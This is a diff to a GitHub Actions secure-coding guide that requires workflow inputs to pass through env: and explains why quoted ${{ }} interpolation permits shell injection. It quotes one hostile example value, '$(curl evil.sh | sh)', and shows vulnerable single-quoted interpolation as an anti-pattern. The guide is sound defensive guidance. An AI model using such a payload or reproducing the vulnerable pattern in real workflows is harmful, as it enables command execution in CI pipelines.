@@ -569,15 +569,49 @@ security boundary, not a style choice.
         )
   ```
 
-- **Single-quoting `'${{ ... }}'` directly in the script is a narrower, weaker protection — reserve it for values
-  proven not to contain a single quote.** It blocks `$()`/backtick command substitution, but a literal `'` in the
-  substituted value still terminates the quoted string early, and the remaining text becomes new shell syntax —
-  including a value that then executes arbitrary injected commands. **Git ref and branch names are allowed to
-  contain `'`**, so `github.head_ref`, `github.ref_name`, and any free-form `workflow_dispatch` text input (a
-  release `reason`, a target branch name) MUST go through `env:`, never be single-quoted directly. Reserve direct
-  single-quoting for values from a closed, known set the value cannot escape (`github.event_name`, a boolean/numeric
-  input, a value already validated against an allow-list) — and even then, `env:` is never wrong, only sometimes
-  more verbose than necessary.
+- **`inputs.*` (`workflow_call` and `workflow_dispatch`) MUST always go through `env:` in a shell step — no
+  exceptions, regardless of how bounded the value looks today.** An input that is safe now (a maintainer-only enum,
+  a number-shaped string, a JSON array assembled from repo configuration) can become unsafe later without the
+  `run:` step changing at all: someone relaxes its `type`, a caller starts forwarding a value it no longer fully
+  controls, or a field that was "obviously a repo-config value" quietly starts accepting a workflow_dispatch
+  override. Judging an input's trust level at the call site means re-deriving that judgment every time the input's
+  provenance could have changed, and getting it wrong is exactly how `reason` and `bencher-branch` ended up
+  single-quoted directly in this repo's own reusable workflows before this rule existed. Routing unconditionally
+  through `env:` costs a couple of extra lines and removes the judgment call entirely — it is correct whether or not
+  the input ever becomes attacker-influenceable.
+
+  ```yaml
+  # Preferred: every input goes through env:, regardless of apparent trust level
+  - name: Compute release version
+    env:
+      MINVER_TAG_PREFIX: ${{ inputs.minver-tag-prefix }}
+      REASON: ${{ inputs.reason }}
+    run: |
+        declare -a args=(
+            --minver-tag-prefix "$MINVER_TAG_PREFIX"
+            --reason            "$REASON"
+        )
+
+  # Avoid: single-quoting inputs.* directly, even for a value that looks closed today
+  - name: Compute release version
+    run: |
+        declare -a args=(
+            --minver-tag-prefix '${{ inputs.minver-tag-prefix }}'
+            --reason            '${{ inputs.reason }}'
+        )
+  ```
+
+- **For every other expression source** (`github.*`, `secrets.*`, `needs.*.outputs.*`, `steps.*.outputs.*`,
+  `vars.*`), single-quoting `'${{ ... }}'` directly in the script is a narrower, weaker protection than `env:` —
+  reserve it for values proven not to contain a single quote. It blocks `$()`/backtick command substitution, but a
+  literal `'` in the substituted value still terminates the quoted string early, and the remaining text becomes new
+  shell syntax — including a value that then executes arbitrary injected commands. **Git ref and branch names are
+  allowed to contain `'`**, so `github.head_ref` and `github.ref_name` MUST go through `env:`, never be
+  single-quoted directly. Reserve direct single-quoting for values from a closed, known set the value cannot escape
+  (`github.event_name`, a boolean/numeric literal, a value already validated against an allow-list) — and even then,
+  `env:` is never wrong, only sometimes more verbose than necessary. A `needs.*`/`steps.*` output that merely
+  forwards an `inputs.*` value (e.g. a `reason` re-exposed as a job output) carries that input's own risk and MUST
+  follow the `inputs.*` rule above, not this one.
 - **Double-quoting `"${{ ... }}"` directly in the script is never correct.** Bash evaluates `$()`/backtick command
   substitution inside double quotes, so an attacker-influenced value containing one (`$(curl evil.sh | sh)`) executes
   it outright — strictly worse than the single-quote case above, which at least requires a `'` in the value rather
